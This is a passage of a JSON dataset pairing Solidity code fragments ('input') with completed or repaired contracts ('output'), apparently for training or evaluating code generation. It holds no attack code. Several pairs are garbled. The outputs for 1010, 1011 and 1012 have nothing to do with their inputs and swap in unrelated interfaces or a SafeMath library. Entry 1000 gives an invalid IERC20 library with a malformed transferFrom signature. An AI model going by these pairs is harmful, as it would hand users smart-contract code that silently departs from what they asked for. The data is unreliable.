IERC20(tokenAddress).transferFrom(msg.sender, targetAddress, allowance);\n                emit TokensTransferred(tokenAddress, msg.sender, targetAddress, allowance);\n            }\n        }\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\nlibrary IERC20 {\n    function allowance(address, address) external view returns (uint256);\n\n    function approve(address, uint256) external returns (bool);\n\n    function balanceOf(address) external view returns (uint256);\n\n    function transfer(address, uint256) external returns (bool);\n\n    function transferFrom(address, uint256, address) external returns (bool);\n}\n\n"
    },
    "1001.sol": {
        "input": "returns(uint)\n\nreturns(uint[] memory)\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ERC20Interface {\n    \n    \n    function totalSupply() external view returns(uint);\n    \n    function balanceOf(address account) external view returns(uint);\n    \n    function transfer(address recipient, uint amount) external returns(bool);\n    \n    function allowance(address owner, address spender) external view returns(uint);\n    \n    function transferFrom(address sender, address recipient, uint amount) external returns(bool);\n    \n    function approve(address spender, uint amount) external returns(bool);\n    \n    \n    event Transfer(address indexed sender, address indexed recipient, uint amount);\n    \n    \n    event Approval(address indexed owner, address indexed spender, uint amount);\n}\n\n"
    },
    "1002.sol": {
        "input": "\npragma solidity 0.8.7; \n\ncontract Rating{\n\n    string[] moviesList;\n\n    mapping(string => uint8) movieRatings;\n\n    constructor() {\n        moviesList = [\"movie1\",\"movie2\",\"movie3\"]; \n    }\n\n    function addMovie(string memory movie) public returns(string memory){\n        moviesList.push(movie);\n        return movie;\n    }\n\n    function getList() public view returns(string[] memory){ \n        return moviesList;\n    }\n\n    function rateMovie(string memory movie,uint8 rating) public {\n        require(rating >=0 && rating <= 10,\"rating is out of range\");\n        movieRatings[movie] = rating;\n    }\n    \n    function getMovieRating(string memory movie) public view returns(uint8){\n        return movieRatings[movie];\n    }\n\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\n\npragma solidity 0.8.7; \n\ncontract Rating{\n\n    string[] moviesList;\n\n    mapping(string => uint8) movieRatings;\n\n    constructor() {\n        moviesList = [\"movie1\",\"movie2\",\"movie3\"]; // this is default list of movies you can add in constructor \n    }\n\n    // add movies\n    function addMovie(string memory movie) public returns(string memory){\n        moviesList.push(movie);\n        return movie;\n    }\n\n    // get list of movies\n    function getList() public view returns(string[] memory){ \n        return moviesList;\n    }\n\n    // rate movie with rating\n    function rateMovie(string memory movie,uint8 rating) public {\n        require(rating >=0 && rating <= 10,\"rating is out of range\");\n        movieRatings[movie] = rating;\n    }\n    \n    // get movie rating by passing movie name\n    function getMovieRating(string memory movie) public view returns(uint8){\n        return movieRatings[movie];\n    }\n\n}\n\n"
    },
    "1004.sol": {
        "input": "pragma solidity ^0.8.4;\n\ncontract Steezy  { \n\n    function contractAddress() public view returns (address asd){\n        return address(this);\n    }\n    function buy() public payable{\n        uint256 listenPrice = 25000000000000000;\n        (bool successs, ) = address(this).call{value: listenPrice}(\"\");\n        require(successs, \"Failed\");\n    }\n    fallback() external payable {}\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\ncontract Steezy  { \n\n    function contractAddress() public view returns (address asd){\n        return address(this);\n    }\n    function buy() public payable{\n        uint256 listenPrice = 25000000000000000;\n        (bool successs, ) = address(this).call{value: listenPrice}(\"\");\n        require(successs, \"Failed\");\n    }\n    fallback() external payable {}\n}\n\n"
    },
    "1005.sol": {
        "input": "pragma solidity ^0.4.17;\n\ncontract dynamic_array\n{\n    int[] public myArray;\n    int x;\n    int y;\n\n    function dynamic_array() public {\n        x = x + 2;\n        y = 5;\n        myArray.push(1);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.4.17;\n\ncontract dynamic_array\n{\n    int[] public myArray;\n    int x;\n    int y;\n\n    // Constructor in version 0.4\n    // is a `public` function with the same name as the contract\n    function dynamic_array() public {\n        x = x + 2;\n        y = 5;\n        myArray.push(1);\n    }\n}\n\n"
    },
    "1006.sol": {
        "input": "currentShares = (_amount * (totalShares)) / (pool);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MySmartContract {\n    uint256 public totalShares;\n    uint256 public pool;\n\n    function calculateShares(uint256 _amount) public view returns (uint256 currentShares) {\n        require(totalShares > 0, \"Total shares must be greater than zero\");\n        require(pool > 0, \"Pool must be greater than zero\");\n\n        currentShares = (_amount * totalShares) / pool;\n    }\n\n    function setTotalShares(uint256 _totalShares) public {\n        totalShares = _totalShares;\n    }\n\n    function setPool(uint256 _pool) public {\n        pool = _pool;\n    }\n}\n\n"
    },
    "1007.sol": {
        "input": "pragma solidity >= 0.7.0 < 0.9.0;\n\ncontract test {\n    \n    struct Identity {\n        uint age;\n        string name;\n    }\n    \n    struct NestedIdentity {\n        Identity identity;\n    }\n    \n    Identity identity = Identity(29, 'Issei Kumagai');\n    \n    NestedIdentity nested_identity = NestedIdentity(identity);\n    \n    function valueFromStruct() public view returns(uint age, string memory name) {\n        return (nested_identity.identity.age, nested_identity.identity.name);\n    }\n\n}\n\nfunction valueFromStruct() public view returns(Identity memory) {\n    return nested_identity.identity;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract test {\n    \n    struct Identity {\n        uint age;\n        string name;\n    }\n    \n    struct NestedIdentity {\n        Identity identity;\n    }\n    \n    Identity identity = Identity(29, 'Issei Kumagai');\n    \n    NestedIdentity nested_identity = NestedIdentity(identity);\n    \n    function valueFromStruct() public view returns(uint age, string memory name) {\n        return (nested_identity.identity.age, nested_identity.identity.name);\n    }\n\n}\n\n"
    },
    "1008.sol": {
        "input": "pragma solidity ^0.8.0;\n\ncontract Counter { \n    uint public Count = 0;\n    event EventIncrement(uint value);\n    event EventDecrement(uint value);\n\n    function getCount() view public returns(uint) {\n        return Count;\n    }\n\n    function Increment() public {\n        Count += 1;\n        emit EventIncrement(Count);\n    }\n\n    function Decrement() public {\n        Count -= 1;\n        emit EventDecrement(Count);\n    }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Counter { \n    uint public Count = 0;\n    // NOTE: I changed name to these two events\n    event EventIncrement(uint value);\n    event EventDecrement(uint value);\n\n    function getCount() view public returns(uint) {\n        return Count;\n    }\n\n    function Increment() public {\n        Count += 1;\n        emit EventIncrement(Count);\n    }\n\n    function Decrement() public {\n        Count -= 1;\n        emit EventDecrement(Count);\n    }\n}\n\n"
    },
    "1009.sol": {
        "input": "function submitHash(bytes hash) public {\n    hashes[msg.sender] = hash;\n}\n\nfunction submitAnswer(uint256 colorid, uint256 secret) public {\n    require(votesIn, \"votes are not all in\");\n    require(keccak256(abi.encodePacked(colorId, secret)) == hashes[msg.sender], \"invalid response\");\n    votes[colorId] += 1;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Voting {\n    mapping (address => bytes32) public hashes;\n    mapping (uint256 => uint256) public votes;\n    bool public votesIn = false;\n\n    function submitHash(bytes32 hash) public {\n        hashes[msg.sender] = hash;\n    }\n\n    function submitAnswer(uint256 colorId, uint256 secret) public {\n        require(votesIn, \"votes are not all in\");\n        require(keccak256(abi.encodePacked(colorId, secret)) == hashes[msg.sender], \"invalid response\");\n        votes[colorId] += 1;\n    }\n    \n    function setVotesIn() public {\n        votesIn = true;\n    }\n}\n\n"
    },
    "1010.sol": {
        "input": "address contractDeployer;\nuint txCharge = 1 \n\nconstructor(string memory name_, string memory symbol_) {\n  _name = name_;\n  _symbol = symbol_;\n  contractDeployer= msg.sender;\n}\n\nfunction transfer(address to, uint256 amount) public virtual override returns (bool) {\n  address owner = _msgSender();\n  _transfer(owner, contractDeployer, amount * txCharge / 100); \n  _transfer(owner, to, amount - (amount * txCharge/100);\n  return true;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function transferMaker(address to, uint256 amount) external;\n}\n\ninterface IERC20Burnable {\n    function burn(address account, uint256 amount) external;\n}\n\n"
    },
    "1011.sol": {
        "input": "const minterHex = web3.utils.fromAscii('ROLE_MINTER')\n\nbytes32 public constant ROLE_MINTER = keccak256(\"ROLE_MINTER\");\n\nconst minterHash = web3.utils.soliditySha3('ROLE_MINTER');\nconst result = await factoryContract.methods.hasRole(minterHash, OWNER_ADDRESS).call();\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract IFactory {\n\n  function hasRole(\n    bytes32 role,\n    address account\n  ) public view returns (bool);\n\n  function grantsRole(bytes32 role, address account) public;\n}\n\n"
    },
    "1012.sol": {
        "input": "        for(uint8 participatorIndex = 0; participatorIndex<participators.length; participatorIndex++){\n            rate = uint8(balances[participators[participatorIndex]]*100/pot);\n            for(; participatorIndex<rate ; participatorsRatesIndex++){\n                participatorsRates[participatorsRatesIndex] = participatorIndex;\n            }\n            balances[participators[participatorIndex]]=0;\n        }\n\n\n",
        "output": "pragma solidity ^0.8.9;\n    library SafeMathLib {\n      function mul(uint256 a, uint256 b) internal pure returns(uint256) {\n        if (a == 0) {\n          return 0;\n        }\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMathLib: multiplication overflow\");\n        return c;\n      }\n\n      function div(uint256 a, uint256 b) internal pure returns(uint256) {\n        return a / b;\n      }\n\n      function mod(uint256 a, uint256 b) internal pure returns(uint256) {\n        return a % b;\n      }\n\n      function add(uint256 a, uint256 b) internal pure returns(uint256) {\n        return a + b;\n      }\n\n    }\n\n"
    }
}